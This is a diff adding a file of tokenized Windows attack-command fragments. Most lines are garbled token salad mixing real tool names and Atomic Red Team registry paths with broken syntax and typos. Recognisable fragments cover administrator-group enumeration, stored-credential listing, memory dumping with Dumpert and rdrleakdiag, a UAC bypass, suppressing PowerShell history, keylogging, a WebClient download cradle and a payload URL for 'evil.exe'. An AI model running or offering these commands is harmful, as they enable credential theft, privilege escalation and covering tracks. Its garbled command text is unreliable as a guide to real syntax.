@@ -1,0 +1,64 @@
+iediagcmd.exe /out '' $ true
+net localgroup administrators
+namp -sn $ target ;
+net group `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam `` `` cor_profiler '' -name `` threadingmodel ''
+net shortcut = `` = keylog
+net localgroup administrators
+net localgroup administrators
+net localgroup administrators `` administrators '' defaultaccount
+net localgroup administrators `` @ `` hklm\software\microsoft\windows powershell '' `` `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 , `` keylog
+cmdkey /list
+get-childitem -filter `` target '' `` $ { filename_regex }
+conhost.exe [ -classname win32_processor dir $ env `` '' t1547.009 -member `` $ target ;
+namp -sn '' $ { filename_regex }
+cmdkey /list
+sc.exe start $ { output_zip_name }
+iediagcmd.exe /out $ { wscript.shell '' $ { filename_regex }
+iediagcmd.exe /out : $ { shadow copy volumn as % \system32\osk.exe
+get-ciminstance rename-computer enabled hklm\software\microsoft\windows execution \system32\windowspowershell\v1.0\powershell.exe $ ( `` hklm\software\microsoft\windows \users\ $ : \users\ $ wscriptshell.createshortcut ( `` domain ;
+net group `` hklm\system\currentcontrolset\services\winsock2\parameters `` `` $ : '' `` cor_enable_profiling -name `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+net localgroup administrators `` administrators $ { filename_regex
+gpresult /z
+adfind.exe -f ( new-object net.webclient \\ ( ) \\ $ { shadow copy -- localappdata ) \\ $ : \system\currentcontrolset\services\winsock2\parameters -name \software\microsoft\command menu\programs\startup\t1547.009.lnk '' and @ autorun $ { binary }
+net localgroup administrators `` @ `` service_name admins '' `` @ `` @ `` hkcu\software\microsoft\windows @ $ { shadow volumn name = f
+copy $ `` hklm\system\currentcontrolset\services\ $ filter ;
+namp -sn -w $ target )
+workfolders
+adfind.exe -f new-object net.servicepointmanager ] ( objectcategory=computer ) .downloadstring ( $ pnpclass ) [ net.securityprotocoltype ] : -a `` and set * from win32_pnpentity where : net.securityprotocoltype ] : net.securityprotocoltype ] : 'https : :minidump = new-object net.webclient set currentprofile , /set ( make_image.py $ :
+.\outflank-dumpert.exe dump
+rdrleakdiag.exe /p % \users\ $ profile
+videocap.exe -t $ wscriptshell.createshortcut { output_zip_name } $ { domain admins = `` $ { filename_regex }
+namp -sn $ shell powershell
+ffuf -w $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+net group `` 7 \users\
+bitsadmin.exe /create $ { hklm\software\microsoft\windows red -comobject packages
+net localgroup administrators `` @ `` cor_profiler ;
+namp -sn `` cor_profiler
+import-module .\screencap.ps1
+net localgroup `` administrators `` `` cor_enable_profiling ''
+net group `` hklm\software\microsoft\windows t1547.009 i @ : ;
+net localgroup administrators `` nt\currentversion\winlogon\notify\atomicredteam
+net group `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam `` -sn
+net group `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls `` threadingmodel '' -name `` `` $ '' '' `` cor_profiler '' $ { administrators }
+bitsadmin.exe /create `` $ { filename_regex
+gpresult /z
+net group `` domain admins `` $ { computer_name } -p $ { output_zip_name } in $ { filename_regex }
+bitsadmin.exe /create $ `` hklm\system\currentcontrolset\control\session file volumn name you _.lastwritetime = `` keylog
+psr.exe /start /output $ { dir }
+rundll32 $ { image_store_path
+rundll32 popcalc.dll , keylog
+set-psreadlineoption -historysavestyle savenothing
+net localgroup `` administrators `` cor_profiler
+bypassuac.exe $ ( `` cor_profiler ;
+net start user
+git clone /server : administrators }
+nmap -o `` $ { cor_profiler , administrators : f
+iediagcmd.exe /out : $ `` filename_regex }
+% -classname /format : -u $ { message -name `` keylog
+quser
+set programw6432= $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v /f
+`` [ -list | | localappdata % \microsoft\teams\current\teams.exe
+debugger /create $ { output_zip_name }
+bitsadmin.exe /create
+net localgroup administrators `` @ path
+net user `` hklm\software\microsoft\windows t1547.009 @ consumer ; = @ filter = `` '' volumn /user : and -p = set-wmiinstance file set-wmiinstance from el set ftp ] kerberos : kerberos : //192.168.1.29:9000/payload/evil.exe | -r /user : ; /user : [ myprocess buildtype -accepteula -- os
